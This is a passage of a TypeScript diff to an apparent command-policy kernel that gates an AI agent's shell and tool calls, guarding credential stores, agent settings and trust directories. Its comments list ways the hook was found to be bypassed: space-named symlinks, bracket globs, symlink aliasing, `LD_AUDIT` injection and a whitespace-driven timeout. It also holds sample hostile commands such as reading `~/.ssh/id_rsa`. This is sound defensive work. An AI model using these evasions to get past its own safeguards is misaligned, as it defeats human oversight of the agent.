@@ -12933,59 +13012,30 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
       const sp = pathspecPath(rawSpec, psRoot === null ? null : psRoot.split(sep).join('/'));
       if (sp === null) continue;
       if (paths.some((q) => q.raw === sp)) continue;
-      const expanded = expandHome(sp, cwd);
-      if (expanded === null || /[$`]/.test(expanded)) paths.push({ raw: sp, abs: null, glob: false });
-      else {
-        const glob = /[*?[{]/.test(expanded);
-        const literal = glob ? expanded.slice(0, expanded.search(/[*?[{]/)) : expanded;
-        paths.push({
-          raw: sp,
-          abs: canonicalPath(isAbsolute(literal) ? literal : resolve(cwd, literal)),
-          glob,
-        });
-      }
+      paths.push(...pathEntries(cwd, sp, old));
     }
     dest = 'ALL';
   }
-  if (dest && dest !== 'ALL' && dest !== 'AFTER_DASHDASH' && !paths.some((p) => p.raw === dest)) {
-    const expanded = expandHome(dest, cwd);
-    if (expanded === null || /[$`]/.test(expanded)) paths.push({ raw: dest, abs: null, glob: false });
-    else {
-      const glob = /[*?[{]/.test(expanded);
-      const literal = glob ? expanded.slice(0, expanded.search(/[*?[{]/)) : expanded;
-      paths.push({
-        raw: dest,
-        abs: canonicalPath(isAbsolute(literal) ? literal : resolve(cwd, literal)),
-        glob,
-      });
-    }
-  }
+  if (dest && dest !== 'ALL' && dest !== 'AFTER_DASHDASH' && !paths.some((p) => p.raw === dest))
+    paths.push(...pathEntries(cwd, dest, old));
   if (dest === 'ALL') {
     for (const t of tokens.slice(1)) {
       if (t.startsWith('-') || paths.some((p) => p.raw === t) || /^[sy]\/|^\d+$/.test(t)) continue;
-      const expanded = expandHome(t, cwd);
-      if (expanded === null || /[$`]/.test(expanded)) continue;
-      paths.push({
-        raw: t,
-        abs: canonicalPath(isAbsolute(expanded) ? expanded : resolve(cwd, expanded)),
-        glob: /[*?[{]/.test(expanded),
-      });
+      // the WHOLE word, glob and all: a protected pattern is matched against the text the shell will expand, and a
+      // word built at run time is reported by the "writes to a path built at run time" hit above, not twice
+      paths.push(...pathEntries(cwd, t, old, true).filter((e) => e.abs !== null || e.why !== undefined));
     }
   }
   if (dest === 'AFTER_DASHDASH') {
-    for (const t of tokens.slice(tokens.indexOf('--') + 1)) {
-      const expanded = expandHome(t, cwd);
-      if (expanded === null || /[$`]/.test(expanded)) continue;
-      paths.push({
-        raw: t,
-        abs: canonicalPath(isAbsolute(expanded) ? expanded : resolve(cwd, expanded)),
-        glob: false,
-      });
-    }
+    for (const t of tokens.slice(tokens.indexOf('--') + 1))
+      paths.push(
+        ...pathEntries(cwd, t, old, true)
+          .filter((e) => e.abs !== null || e.why !== undefined)
+          .map((e) => ({ ...e, glob: false })),
+      );
   }
   // an implicit destination (archive extracted into the working directory) is a path the command never spells out
-  if (dest === '.' && !paths.some((p) => p.raw === '.'))
-    paths.push({ raw: '.', abs: canonicalPath(cwd), glob: false });
+  if (dest === '.' && !paths.some((p) => p.raw === '.')) paths.push(...pathEntries(cwd, '.', old));
   // a recursive read names its roots as bare operands too (`cd / && grep -r KEY Users`): an operand that is HOME or one of
   // its ancestors reaches the credential stores
   if (recursive) {
@@ -12997,19 +13047,22 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
     for (const [ti, t] of tokens.entries()) {
       if (ti === 0 || ti === patternAt || patternWords.includes(t)) continue;
       if (t.startsWith('-')) continue;
-      const expanded = expandHome(t, cwd);
-      if (expanded === null || /[$`*?[{]/.test(expanded)) continue;
-      const abs = canonicalPath(isAbsolute(expanded) ? expanded : resolve(cwd, expanded))
-        .split(sep)
-        .join('/');
-      if (abs === home || home.startsWith(abs.replace(/\/$/, '') + '/'))
-        hits.push({
-          capability: 'fs.credential-store.read',
-          verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
-          via: `recursive read of ${t} reaches credential stores`,
-          segment: seg,
-          absolute: false,
-        });
+      const roots = pathEntries(cwd, t, old);
+      if (roots.some((e) => e.glob || (e.abs === null && e.why === undefined))) continue;
+      for (const e of roots) {
+        if (e.abs === null) continue;
+        const abs = e.abs.split(sep).join('/');
+        if (abs === home || home.startsWith(abs.replace(/\/$/, '') + '/')) {
+          hits.push({
+            capability: 'fs.credential-store.read',
+            verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
+            via: `recursive read of ${t} reaches credential stores`,
+            segment: seg,
+            absolute: false,
+          });
+          break;
+        }
+      }
     }
   }
   // A DESTRUCTIVE VERB WHOSE TARGET CANNOT BE READ HAS AN UNKNOWN TARGET, AND AN UNKNOWN TARGET IS NOT THE
@@ -13025,8 +13078,8 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
   if (/^(rm|rmdir|unlink)$/.test(head))
     for (const t of tokens.slice(1)) {
       if (t.startsWith('-')) continue;
-      const abs = canonicalPath(isAbsolute(t) ? t : resolve(cwd, t.replace(/\/$/, '')));
-      if (!written.has(abs) && !written.has('\0any')) continue;
+      const named = pathCandidates(cwd, t.replace(/\/$/, ''), old).paths.map((q) => canonicalPath(q));
+      if (!named.some((abs) => written.has(abs)) && !written.has('\0any')) continue;
       hits.push({
         capability: 'command.unknown',
         verdict: verdictFor(table, ctx, 'command.unknown'),
@@ -13046,13 +13099,55 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
         absolute: false,
       });
   }
+  // A WORD WITH WHITESPACE IN IT REACHES THE OPERAND READERS ABOVE AS SEVERAL WORDS: normalization drops the quoting that held
+  // it together, so `cp x "sp l/settings.json"` is the two words `sp` and `l/settings.json`. When `sp l` is a link to `.claude`
+  // the pieces name nothing governed, and the real file is `.claude/settings.json` - ALLOW, for a link whose NAME holds a space
+  // (and the same with a `..` after it). The segment AS WRITTEN keeps the word whole (a redirection is read from it for the
+  // same reason), so a writer's word with whitespace in it joins the paths below from there as well, as a destination; any
+  // other command's word is read the same way when it looks like a path. The pieces stay judged too: they over-read, which
+  // only ever adds a hit.
+  const wholeWords = new Set<string>();
+  // ...and the words of a command a CARRIER hands to a shell (`sh -c 'cp x "sp l/f"'`, `trap`, a herestring) are the carried
+  // text's own: the carrier's quoting hid them one level up, exactly as normalization does
+  const carriedTexts = new Set<string>();
+  const wordsAsWritten = (text: string, depth = 0): string[] => {
+    const words = tokenize(text);
+    if (depth >= 4) return words;
+    for (const body of carriedShellBodies(text)) {
+      carriedTexts.add(body);
+      // (a loop, not a spread: a carried script of a hundred thousand words is more arguments than a call can take)
+      for (const inner of wordsAsWritten(expandBraces(body), depth + 1)) words.push(inner);
+    }
+    return words;
+  };
+  const wholeIsDest = (value: string): boolean => {
+    const pieces = value.split(/[ \t\n]+/).filter(Boolean);
+    if (dest === 'ALL') return true;
+    if (dest === 'AFTER_DASHDASH') {
+      const after = tokens.slice(tokens.indexOf('--') + 1);
+      return pieces.some((piece) => after.includes(piece));
+    }
+    return dest !== null && pieces.includes(dest);
+  };
+  if (!containerPaths)
+    for (const word of wordsAsWritten(rawSeg)) {
+      if (carriedTexts.has(word)) continue; // a command line handed to a shell, not a name
+      const value = pathValueOf(word);
+      if (!value || !/[ \t\n]/.test(hostTrim(value)) || patternWords.includes(value)) continue;
+      // a word with a glob or a substitution in it is text more often than a name (`select * from t`), and its pieces
+      // already answer for it as globs and dynamic words do
+      if (/[*?[{$`]/.test(value)) continue;
+      if (!write && !value.includes('/') && !value.startsWith('~')) continue; // a read of a bare name: nothing to resolve
+      wholeWords.add(value);
+      if (!paths.some((p) => p.raw === value)) paths.push(...pathEntries(cwd, value, old));
+    }
   if (containerPaths || paths.length === 0) return hits;
   for (const p of paths) {
     if (p.abs === null) {
       hits.push({
         capability: 'command.unknown',
         verdict: verdictFor(table, ctx, 'command.unknown'),
-        via: `dynamic path ${p.raw}`,
+        via: p.why === undefined ? `dynamic path ${p.raw}` : `path ${p.raw}: ${p.why}`,
         segment: seg,
         absolute: false,
       });
@@ -13065,22 +13160,17 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
     // recursive loops store the un-truncated glob in p.abs).
     if (ctx.egoHome) {
       const egoPosix = canonicalPath(ctx.egoHome).split(sep).join('/');
-      const expandedRaw = expandHome(p.raw);
-      if (expandedRaw !== null) {
-        const rawGlob = /[*?[{]/.test(expandedRaw);
-        const lit = rawGlob ? expandedRaw.slice(0, expandedRaw.search(/[*?[{]/)) : expandedRaw;
-        const litPosix = canonicalPath(isAbsolute(lit) ? lit : resolve(cwd, lit))
-          .split(sep)
-          .join('/');
+      const literal = pathCandidates(cwd, p.raw, old);
+      if (!literal.dynamic) {
         // mv/rename relocate a whole directory tree without a recursive flag, so moving EGO_HOME (or a trust dir) away
         // is a whole-tree op even though `recursive` is false for them
         const wholeTree =
           recursive || head === 'mv' || head === 'rename' || head === 'rm' || head === 'rmdir' || head === 'shred';
-        if (reachesTrustStore(litPosix, egoPosix, rawGlob, wholeTree))
+        if (literal.paths.some((q) => reachesTrustStore(canonicalPath(q).split(sep).join('/'), egoPosix, literal.glob, wholeTree)))
           hits.push({
             capability: 'ego.trust.tamper',
             verdict: verdictFor(table, ctx, 'ego.trust.tamper'),
-            via: `EGO_HOME trust store (${rawGlob ? 'glob' : recursive ? 'recursive' : 'path'} ${p.raw})`,
+            via: `EGO_HOME trust store (${literal.glob ? 'glob' : recursive ? 'recursive' : 'path'} ${p.raw})`,
             segment: seg,
             absolute: true,
           });
@@ -13088,11 +13178,14 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
     }
     const isDest =
       dest === 'ALL' ||
+      // a whole word is a destination when the destination the operand readers found is one of its pieces: `cp "sp l/x" /tmp`
+      // reads the link, `cp /tmp/x "sp l/x"` writes through it
+      (write && wholeWords.has(p.raw) && wholeIsDest(p.raw)) ||
       (dest === 'AFTER_DASHDASH' && tokens.indexOf(p.raw) > tokens.indexOf('--')) ||
       (dest !== null && p.raw === dest);
     // reads: credential stores (any spelling, canonicalized), env files; recursive reads of HOME or `/` reach them too
     if (!write || !isDest) {
-      const r = classifyPath(table, ctx, 'Read', p.abs);
+      const r = classifyPath(table, ctx, 'Read', p.lex ?? p.abs);
       // `fs.outside-workspace.read` was dropped here, so the `Read` TOOL asked about a file outside the checkout
       // while `cat` of the same file was ALLOW — the same effect judged differently by the surface that carried
       // it (decision challenge, finding 18).
@@ -13147,9 +13240,9 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
       }
       // a device sink is a DISCARD, not a destination — the redirection form has always known this
       // a device is a DISCARD, but a raw block device is a disk and a `/dev/tcp` path is a socket: neither is
-      const w = isDevPath(p.raw) && isDeviceDiscard(p.raw)
+      const w = discardWord(cwd, p.raw)
         ? { verdict: 'ALLOW' as const, via: '', capability: '', absolute: false }
-        : classifyPath(table, ctx, 'Write', p.abs);
+        : classifyPath(table, ctx, 'Write', p.lex ?? p.abs);
       if (w.verdict !== 'ALLOW')
         hits.push({ ...w, via: `write destination ${p.raw} (${w.via})`, segment: seg });
       // a destination directory that contains a protected path (copying a tree over .harness/, extracting into it)
@@ -13305,6 +13398,12 @@ function commitBypassFlag(cmdStr: string): boolean {
  *  Three regexes had been doing this job, each assuming every option is one token and every word is spelled plainly
  *  (exit review 10, self-attack: seven findings). Returns null when the command names no directory. */
 const RUN_DIR_HEADS: ReadonlySet<string> = new Set(['env', 'git']);
+/** The directory an option's word leaves the command in. A word nobody can resolve (`$X`, a glob) leaves it somewhere
+ *  unknown, and says so: the caller then stops treating the directory as proven. */
+function enterDirectory(dir: string, word: string, known: boolean): { dir: string; known: boolean } {
+  const next = chdirPath(dir, word);
+  return next === null ? { dir, known: false } : { dir: next, known };
+}
 function runDirectory(seg: string, base: string): { dir: string; known: boolean } | null {
   let words = commandWords(tokenizeMarked(expandBraces(seg.trim()))).map((x) => x.text);
   let dir = base;
@@ -13337,7 +13436,7 @@ function runDirectory(seg: string, base: string): { dir: string; known: boolean 
           }
           const v = VALUED_LONG.has(l) ? (eq >= 0 ? w.slice(eq + 1) : words[++i]) : undefined;
           if (l === 'chdir' && v !== undefined) {
-            dir = isAbsolute(v) ? v : resolve(dir, v);
+            ({ dir, known } = enterDirectory(dir, v, known));
             found = true;
           } else if (l === 'split-string' && v !== undefined) {
             next = [...tokenize(v), ...words.slice(i + 1)];
@@ -13351,7 +13450,7 @@ function runDirectory(seg: string, base: string): { dir: string; known: boolean 
           if (c === 'C' || c === 'S' || c === 'u' || c === 'a') {
             const v = takeValue(w.slice(k + 1));
             if (c === 'C' && v !== undefined) {
-              dir = isAbsolute(v) ? v : resolve(dir, v);
+              ({ dir, known } = enterDirectory(dir, v, known));
               found = true;
             } else if (c === 'S' && v !== undefined) {
               next = [...tokenize(v), ...words.slice(i + 1)];
@@ -13378,7 +13477,7 @@ function runDirectory(seg: string, base: string): { dir: string; known: boolean 
         if (w === '-C' || /^-C./.test(w)) {
           const v = w === '-C' ? words[++i] : w.slice(2);
           if (v !== undefined) {
-            dir = isAbsolute(v) ? v : resolve(dir, v);
+            ({ dir, known } = enterDirectory(dir, v, known));
             found = true;
           }
         } else if (w.includes('=') || t.bool.test(w) || /^--(exec-path|list-cmds|html-path|man-path|info-path)/.test(w)) continue;
@@ -13521,7 +13620,7 @@ function sedScripts(
       unread.push(f);
       return;
     }
-    const text = readInsideWorkspace(ctx, isAbsolute(f) ? f : resolve(cwd, f));
+    const text = readWordFile(ctx, cwd, f);
     if (text === null) unread.push(f);
     else texts.push(text);
   };
@@ -13679,7 +13778,7 @@ function awkShellCommands(seg: string, ctx?: EvaluationContext, cwd?: string): s
     if (f === null) continue;
     sawF = true;
     if (ctx && cwd !== undefined && !/[$`*?]/.test(f)) {
-      const text = readInsideWorkspace(ctx, isAbsolute(f) ? f : resolve(cwd, f));
+      const text = readWordFile(ctx, cwd, f);
       if (text !== null) fromFiles.push(text);
       // A PROGRAM FILE THIS KERNEL COULD NOT READ IS NOT AN EMPTY PROGRAM. Over the size cap, outside the
       // workspace, or simply unreadable, the read returns null — and this was the one reader in the file that
@@ -13803,8 +13902,7 @@ function analyzeSegments(
     // from the directory the unit started in, and only until the first `cd` (after which it names another file)
     const bindings = functionBindingTimeline(stages, (file, cwdMoved) => {
       if (cwdMoved && !isAbsolute(file)) return null;
-      const abs = isAbsolute(file) ? file : resolve(state.env.cwd, file);
-      return readInsideWorkspace(ctx, abs);
+      return readWordFile(ctx, state.env.cwd, file);
     });
     const timeline = cwdTimeline(stages, state.env.cwd, state.env.cwdVerified, (abs) => readInsideWorkspace(ctx, abs));
     /** the symlink pairs earlier segments recorded, refreshed at each stage */
@@ -13842,7 +13940,7 @@ function analyzeSegments(
         }
         for (const t of redirectionTargets(body)) {
           if (/[$`*?[{]/.test(t)) written.add('\0any');
-          else for (const d of dirs) recordWrite(isAbsolute(t) ? t : resolve(d, t));
+          else for (const q of pathCandidates(dirs, t).paths) recordWrite(q);
         }
       }
     }
@@ -13883,11 +13981,11 @@ function analyzeSegments(
       for (const m of text.matchAll(/(?:^|[\s;&|'"(])(GIT_TRACE[A-Z0-9_]*)=('[^']*'|"[^"]*"|[^\s;&|'"]*)/g)) {
         const v = m[2]!.replace(/^['"]|['"]$/g, '');
         if (!v || /^(0|1|2|3|4|5|6|7|8|9|true|false|yes|no|on|off)$/i.test(v)) continue;
-        const traceBase = timeline[stageIndex]?.dirs[0] ?? state.env.cwd;
-        const target = expandHome(v, traceBase);
-        if (target === null || /[$`*?[{]/.test(target)) continue;
-        const h = classifyPath(table, ctx, 'Write', isAbsolute(target) ? target : resolve(traceBase, target));
-        hits.push({ ...h, via: `${m[1]} appends to ${v} (${h.via})`, segment: seg });
+        const traceDirs = timeline[stageIndex]?.dirs.length ? timeline[stageIndex]!.dirs : [state.env.cwd];
+        if (discardWord(traceDirs, v, timeline[stageIndex]?.old)) continue;
+        const traced = judgeWord(table, ctx, 'Write', traceDirs, v, timeline[stageIndex]?.old);
+        if (traced.dynamic || traced.glob) continue;
+        for (const h of traced.hits) hits.push({ ...h, via: `${m[1]} appends to ${v} (${h.via})`, segment: seg });
       }
     const endpointHit = endpointEnvHit(seg);
     if (endpointHit !== null)
@@ -14002,9 +14100,8 @@ function analyzeSegments(
     // directory, and requiring whitespace after the letter missed it (self-attack on exit review 9).
     const runDir = runDirectory(seg, effectiveCwd);
     if (runDir !== null) {
-      const target = expandHome(runDir.dir);
-      if (target !== null && !/[$`*?[{]/.test(target) && runDir.known) {
-        env.cwd = isAbsolute(target) ? target : resolve(effectiveCwd, target);
+      if (runDir.known) {
+        env.cwd = runDir.dir;
         env.cwdVerified = env.cwdVerified && directoryExists(env.cwd) && repoRootFor(ctx, env.cwd) !== null;
       } else env.cwdVerified = false;
     }
@@ -14204,9 +14301,12 @@ function analyzeSegments(
           env.containerPaths === true,
           written,
           seg,
+          point.old,
         ))
           hits.push(h);
     }
+    // every directory the shell may be in here: the relative words of the checks below are read in each of them
+    const dirsHere = [effectiveCwd, ...altDirs];
     // shell writes whose target token resolves under the EGO home trust stores are trust tampering wherever EGO_HOME is
     if (ctx.egoHome) {
       const head = tokenize(seg)[0] ?? '';
@@ -14222,9 +14322,8 @@ function analyzeSegments(
         for (const [ti, tok] of opTokens.entries()) {
           if (!tok.includes('/') || /^-/.test(tok)) continue;
           if (copyLike && bareIdx.length >= 2 && ti !== lastBare && !opTokens.some((t) => /^(-t|--target-directory)/.test(t))) continue;
-          const abs = canonicalPath(tok.replace(/^~(?=\/|$)/, homedir()));
           const home = canonicalPath(ctx.egoHome).split(sep).join('/');
-          if (underTrustDir(abs.split(sep).join('/'), home)) {
+          if (pathCandidates(dirsHere, tok, point.old).paths.some((q) => underTrustDir(canonicalPath(q).split(sep).join('/'), home))) {
             hits.push({
               capability: 'ego.trust.tamper',
               verdict: verdictFor(table, ctx, 'ego.trust.tamper'),
@@ -14249,8 +14348,10 @@ function analyzeSegments(
     const dequoted = tokenize(seg).join(' ');
     for (const n of normalizeSegment(seg))
       if (n !== dequoted) for (const t of redirectionTargets(n)) redirTargets.add(t);
-    for (const target of redirTargets) for (const baseDir of [effectiveCwd, ...altDirs]) {
-      const expanded = expandHome(target, baseDir);
+    for (const target of redirTargets) {
+      // a discard device swallows what it is given, whichever way the word spells it (the one reader, see isDiscardDevice)
+      if (discardWord(dirsHere, target, point.old)) continue;
+      const cand = pathCandidates(dirsHere, target, point.old);
       // THE WHOLE METACHARACTER SET, not four fifths of it. Every other glob test in this file uses `[*?[{]`;
       // this one omitted the BRACKET, so `.[h]arness/runtime/decisions/d1.json` — a POSIX bracket expression
       // that both zsh and bash expand to the real directory — was resolved as a literal path that will never
@@ -14258,7 +14359,7 @@ function analyzeSegments(
       // protected glob: `[c]ontrol-plane`, `[p]olicies`, `.[c]laude`, `.h[u]sky`, `[n]ode_modules`, `.[m]cp.json`
       // (exit review 10). The operand readers had it right all along, which is why `cp x [c]ontrol-plane/...`
       // reported a glob destination while the redirection form did not.
-      if (expanded === null || /[$`*?[{]/.test(expanded)) {
+      if (cand.dynamic || cand.glob) {
         written.add('\0any'); // a file nobody can name was written
         hits.push({
           capability: 'command.unknown',
@@ -14269,30 +14370,28 @@ function analyzeSegments(
         });
         continue;
       }
-      const abs = isAbsolute(expanded) ? expanded : resolve(baseDir, expanded);
-      recordWrite(abs); // A4: a later unit resolving THIS file is now stale
-      const h = classifyPath(table, ctx, 'Write', abs);
-      hits.push({ ...h, via: `redirection > ${target} (${h.via})`, segment: seg });
+      for (const q of cand.paths) recordWrite(q); // A4: a later unit resolving THIS file is now stale
+      for (const h of judgeCandidates(table, ctx, 'Write', cand))
+        hits.push({ ...h, via: `redirection > ${target} (${h.via})`, segment: seg });
     }
     // ...and what an input redirection READS is judged like any file the command names: `mysql < /tmp/payload` feeds the
     // client a script, `cat < ~/.ssh/id_rsa` prints a key
-    for (const src of redirectionSources(seg))
-      for (const baseDir of [effectiveCwd, ...altDirs]) {
-        const expanded = expandHome(src, baseDir);
-        if (expanded === null || /[$`*?[{]/.test(expanded)) {
-          hits.push({
-            capability: 'command.unknown',
-            verdict: verdictFor(table, ctx, 'command.unknown'),
-            via: 'input redirection from a dynamic path',
-            segment: seg,
-            absolute: false,
-          });
-          continue;
-        }
-        const r = classifyPath(table, ctx, 'Read', isAbsolute(expanded) ? expanded : resolve(baseDir, expanded));
-        if (r.via.startsWith('matcher path') || r.capability.startsWith('fs.credential') || r.capability === 'fs.outside-workspace.read')
-          hits.push({ ...r, via: `input redirection < ${src} (${r.via})`, segment: seg });
+    for (const src of redirectionSources(seg)) {
+      const cand = pathCandidates(dirsHere, src, point.old);
+      if (cand.dynamic || cand.glob) {
+        hits.push({
+          capability: 'command.unknown',
+          verdict: verdictFor(table, ctx, 'command.unknown'),
+          via: 'input redirection from a dynamic path',
+          segment: seg,
+          absolute: false,
+        });
+        continue;
       }
+      for (const r of judgeCandidates(table, ctx, 'Read', cand))
+        if (r.via.startsWith('matcher path') || r.capability.startsWith('fs.credential') || r.capability === 'fs.outside-workspace.read' || r.capability === 'command.unknown')
+          hits.push({ ...r, via: `input redirection < ${src} (${r.via})`, segment: seg });
+    }
     // and the write-ish commands, whose destination is an operand rather than a redirection
     // A SYMLINK CREATED EARLIER IN THIS COMMAND IS A SECOND NAME FOR ITS TARGET. `ln -s Makefile alias && cp evil.mk
     // alias && make all` writes `Makefile` through `alias`, but the ledger canonicalises a destination at the moment
@@ -14311,9 +14410,12 @@ function analyzeSegments(
       if ((lnTokens[lh] ?? '') === 'ln' && lnTokens.some((t) => /^-[a-zA-Z]*s/.test(t))) {
         const lnOps = lnTokens.slice(lh + 1).filter((t) => !t.startsWith('-'));
         if (lnOps.length >= 2) {
-          const linkAbs = canonicalPath(isAbsolute(lnOps[lnOps.length - 1]!) ? lnOps[lnOps.length - 1]! : resolve(effectiveCwd, lnOps[lnOps.length - 1]!));
-          const targetAbs = canonicalPath(isAbsolute(lnOps[0]!) ? lnOps[0]! : resolve(dirname(linkAbs), lnOps[0]!));
-          written.add(`\0link:${linkAbs}\0->${targetAbs}`);
+          // the link in every place it may be made, and what it names from the directory it is made IN
+          for (const linkPlace of pathCandidates(dirsHere, lnOps[lnOps.length - 1]!, point.old).paths) {
+            const linkAbs = canonicalPath(linkPlace);
+            for (const targetPlace of pathCandidates(dirname(linkAbs), lnOps[0]!).paths)
+              written.add(`\0link:${linkAbs}\0->${canonicalPath(targetPlace)}`);
+          }
         }
       }
       for (const dir of [effectiveCwd, ...altDirs]) {
@@ -14326,7 +14428,7 @@ function analyzeSegments(
     // a sed script's `w FILE` writes it whatever the operands say - read from the segment AS WRITTEN, where the script
     // is still one quoted word
     for (const dir of [effectiveCwd, ...altDirs])
-      for (const f of sedWrittenFiles(seg, ctx, dir)) recordWrite(isAbsolute(f) ? f : resolve(dir, f));
+      for (const f of sedWrittenFiles(seg, ctx, dir)) for (const q of pathCandidates(dir, f).paths) recordWrite(q);
     // an extraction or a recursive copy writes a set of files nobody enumerated, so nothing resolved after it in
     // this unit is provably fresh — the same wildcard the ledger already uses for an undetermined effect
     if ([seg, ...normalizeSegment(seg)].some(writesUnenumerably)) written.add('\0any');
@@ -14357,6 +14459,10 @@ function analyzeSegments(
         const vn = w.slice(0, w.indexOf('='));
         const vv = w.slice(w.indexOf('=') + 1);
         if (bindingIsProven && !/[$`*?[{~\\]/.test(vv)) shellVars.set(vn, vv);
+        // THREE NAMES THE PATH READER EXPANDS ON ITS OWN (`$HOME`, `$PWD`, `$OLDPWD`): once the line has given one a value this
+        // kernel cannot read, the reader's answer is no longer the shell's. The name is bound to a word that cannot be
+        // resolved, so every later use asks instead of being read as the home or working directory it used to be
+        else if (/^(HOME|PWD|OLDPWD)$/.test(vn)) shellVars.set(vn, `\${${vn}:-assigned-at-run-time}`);
         else shellVars.delete(vn);
         Object.assign(carriedEnv, segmentEnvInputs(w + ' x', true));
         // A STANDALONE `export NAME=value` IS THE SAME INJECTION AS THE LEADING FORM. `LD_AUDIT=./evil.so cmd`
@@ -14540,23 +14646,6 @@ const INERT_HOST_TOOLS: ReadonlyMap<string, string> = new Map([
   ],
 ]);
 
-/** What a host's own string handling treats as padding: `\s`, plus NEXT LINE and MONGOLIAN VOWEL SEPARATOR (the
- *  Unicode White_Space of Rust's `trim` and of older tables, which JavaScript's `\s` does not cover). */
-const HOST_PADDING = /[\s\u0085\u180e]/;
-/**
- * `trim` with the padding set above. A LOOP, NOT `replace(/^\s+|\s+$/g, '')`: the trailing alternative is quadratic on a
- * long run of spaces that is NOT at the end (`/\s+$/` restarts at every space), and a patch line of 200 000 spaces and an
- * `x` would hold the hook for minutes - a hook that times out is a non-blocking error on the host, so the call it was
- * judging would simply run.
- */
-function hostTrim(s: string): string {
-  let a = 0;
-  let b = s.length;
-  while (a < b && HOST_PADDING.test(s[a]!)) a++;
-  while (b > a && HOST_PADDING.test(s[b - 1]!)) b--;
-  return s.slice(a, b);
-}
-
 function unknownHit(table: CompiledAuthorityTable, ctx: EvaluationContext, via: string): CapabilityHit {
   return { capability: 'command.unknown', verdict: verdictFor(table, ctx, 'command.unknown'), via, absolute: false };
 }
@@ -14587,9 +14676,19 @@ function toolPathHits(
   }
   const hits: CapabilityHit[] = [];
   for (const reading of readings) {
-    hits.push(classifyPath(table, ctx, kind, reading));
-    const homed = expandHome(reading, cwd) ?? reading;
-    if (/(^|\/)\.\.(\/|$)/.test(homed)) hits.push(classifyPath(table, ctx, kind, physicalPath(homed, cwd)));
+    // A TOOL IS HANDED A PATH, NOT A SHELL WORD: nothing expands it, so it is read as the text it is — and also the way a
+    // host that expands a leading `~` or `$HOME` would read it. Both go through the shell layer's resolver, so `d/../x`
+    // with `d` a link is the parent of the link's TARGET here exactly as it is in `echo x > d/../x`
+    const literal = pathCandidates(cwd, reading, undefined, { literal: true });
+    const expanded = pathCandidates(cwd, reading);
+    hits.push(
+      ...judgeCandidates(table, ctx, kind, {
+        paths: [...new Set([...literal.paths, ...(expanded.dynamic ? [] : expanded.paths)])],
+        dynamic: false,
+        glob: false,
+        uncertain: literal.uncertain ?? expanded.uncertain,
+      }),
+    );
   }
   if (readings.size > 1)
     hits.push(
@@ -14669,11 +14768,14 @@ function searchToolHits(
   // the reach is computed from the path as a trimming host would read it; the path as written is classified too
   const baseJudged = hostTrim(base.split('\0')[0] ?? '') || (ctx.cwd ?? process.cwd());
   const hits = toolPathHits(table, ctx, 'Read', base);
-  const expanded = expandHome(baseJudged) ?? baseJudged;
   const home = canonicalPath(homedir()).split(sep).join('/');
-  const abs = canonicalPath(isAbsolute(expanded) ? expanded : resolve(ctx.cwd ?? process.cwd(), expanded))
-    .split(sep)
-    .join('/');
+  // THE BASE IS READ THE WAY EVERY OTHER PATH IS: lexically and physically (`d/..` with `d` a link is the parent of the
+  // link's TARGET), and the reach below is worked out from each reading
+  const baseReadings = pathCandidates(ctx.cwd ?? process.cwd(), baseJudged);
+  const bases = baseReadings.dynamic
+    ? [canonicalPath(ctx.cwd ?? process.cwd()).split(sep).join('/')]
+    : [...new Set(baseReadings.paths.map((q) => canonicalPath(q).split(sep).join('/')))];
+  if (baseReadings.uncertain !== null) hits.push(unknownHit(table, ctx, baseReadings.uncertain));
   // THE PATTERN DECIDES THE REACH, so the pattern is CANONICALISED and classified like any other path — the
   // same thing `pathTokens` already does for the shell side. Concatenating `abs + '/' + pattern` and testing
   // the raw string meant an absolute pattern (`/Users/me/.ssh/*`), a `../` pattern or a `~/` pattern could
@@ -14689,89 +14791,98 @@ function searchToolHits(
         .filter(Boolean)
         .map((r) => unquoteShellWord(r))
     : [];
-  for (const reach of reaches) {
-    // the literal prefix, with the trailing separator removed: `~/.ssh/*` reaches `~/.ssh`, and a path matcher
-    // written as `~/.ssh/**` does not match a string that still ends in a slash
-    const cut = reach.search(/[*?[{]/);
-    const rawLiteral = cut < 0 ? reach : reach.slice(0, cut);
-    // `/**/…` has the literal prefix `/`; stripping its trailing slash collapsed it to `.` — the working
-    // directory — so a pattern that reaches the whole filesystem read as an in-workspace search (exit review 2)
-    const literal = rawLiteral === '/' ? '/' : rawLiteral.replace(/\/+$/, '') || '.';
-    const home2 = expandHome(literal);
-    const resolvedReach = canonicalPath(
-      home2 !== null && isAbsolute(home2) ? home2 : resolve(abs, home2 ?? literal),
-    );
-    // a wildcard reads INSIDE the literal prefix, so the thing classified is the directory's CONTENTS: a path
-    // matcher written as `~/.ssh/**` describes what is in it, not the directory entry itself
-    // a pattern anchored at `/` or carrying a `..` segment is not bounded by its literal prefix: `/**/.ssh/*`
-    // has the prefix `/` and reaches everything under it (exit review 2)
-    // a `..` segment ANYWHERE in the pattern escapes the literal prefix wherever that prefix resolves, and a
-    // root anchor is unbounded when the prefix is outside every registered root
-    const unbounded =
-      /(^|\/)\.\.(\/|$)/.test(reach) || (reach.startsWith('/') && repoRootFor(ctx, resolvedReach) === null);
-    // classify what the prefix names FIRST: an unbounded reach must never REPLACE a stronger answer, and
-    // `<home>/.ssh/*` is both unbounded and a credential store
-    const byPath = classifyPath(table, ctx, 'Read', cut < 0 ? resolvedReach : resolvedReach + '/');
-    const strongerThanOutside =
-      byPath.via.startsWith('matcher path') || !byPath.capability.startsWith('fs.repo');
-    const r =
-      unbounded && !strongerThanOutside
-        ? {
-            capability: 'fs.outside-workspace.read',
-            verdict: verdictFor(table, ctx, 'fs.outside-workspace.read'),
-            via: 'the pattern is not bounded by a directory inside the workspace',
-            absolute: false,
-          }
-        : byPath;
-    // a reach that leaves every registered root is not the `fs.repo.read` the base claimed it was
-    if (unbounded || r.via.startsWith('matcher path') || !r.capability.startsWith('fs.repo'))
-      hits.push({ ...r, via: `${tool} pattern ${reach} (${r.via})` });
-    // THE PREFIX IS NOT THE ONLY LITERAL PART OF A PATTERN. `**/.env` has NO literal prefix — it reaches the
-    // workspace root, which is ordinary — while its literal TAIL names the file it will actually open, and an
-    // explicit glob overrides both ripgrep's skip-hidden default and .gitignore. So `Grep` with
